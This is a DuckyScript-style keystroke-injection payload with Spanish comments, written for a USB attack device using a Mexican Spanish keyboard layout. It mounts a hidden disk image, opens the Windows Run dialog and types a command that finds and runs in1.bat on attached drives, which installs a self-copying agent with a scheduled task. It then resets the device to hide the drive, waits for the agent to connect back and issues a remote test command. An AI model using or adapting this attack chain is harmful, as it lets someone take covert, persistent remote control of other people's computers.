REM Instalador de Agent para teclado LATAM (Spanish Mexico - win_es-MX)
REM Requiere agent.img en la raíz de la SD
REM Basado en us-autorun.ds con layout de teclado LATAM

KEYBOARD_LAYOUT win_es-MX

LOG Instalador agent LATAM

DEFINE #FILE /agentInstalled

REM Solo instalar si es la primera máquina
IF (FILE_EXISTS() == FALSE) THEN
  LOG Archivo agentInstalled no existe
  LOG Instalando agent
  USB_MOUNT_DISK_READ_ONLY /agent.img

  WAIT_FOR_USB_STORAGE_ACTIVITY
  REM Esperar a que aparezca la unidad
  DELAY 5000

  LOG Ejecutando ataque HID con layout LATAM
  REM Abre ventana Run
  GUI R
  DELAY 1000

  REM Busca in1.bat en cada unidad y lo ejecuta con VID/PID
  STRING cmd /c @echo off & for %d in (D E F G H) do if exist %d:\in1.bat %d:\in1.bat #_VID_ #_PID_
  ENTER

  LOG Ataque HID completado
  LOG Si no ves pulsaciones de tecla, revisa el wiki para instrucciones sobre efuse

  REM Esperar a que Windows inicie
  DELAY 1000
  REM Esperar a que se copien archivos y se cree la tarea
  WAIT_FOR_USB_STORAGE_ACTIVITY_TO_STOP
  DELAY 1000

  REM El agent se copia a sí mismo en un lugar seguro y se re-ejecuta
  REM Esperamos a que se conecte

  CREATE_FILE()

  REM Reset para que desaparezca la unidad USB
  RESET
END_IF

LOG Esperando respuesta del agent
WHILE (AGENT_CONNECTED() == FALSE)
  DELAY 2000
END_WHILE

LOG Agent conectado
REM Comando de prueba - ver resultados en los logs
AGENT_RUN dir
